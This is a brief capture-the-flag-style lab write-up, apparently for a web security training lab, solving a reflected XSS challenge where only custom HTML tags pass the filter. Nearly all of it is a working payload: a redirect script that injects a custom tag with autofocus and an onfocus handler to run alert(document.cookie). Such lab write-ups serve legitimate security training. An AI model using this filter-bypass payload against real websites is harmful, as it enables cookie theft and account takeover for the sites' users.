Lab #18 - Reflected XSS into HTML context with all tags blocked except custom ones

Target Goal - Perform an XSS attack that alerts on document.cookie.

Analysis:

<script>
location='https://0a7e00f803d7a1b4c03f6c31001b004a.web-security-academy.net?search=<xss+autofocus+tabindex%3d1+onfocus%3dalert(document.cookie)></xss>';
</script>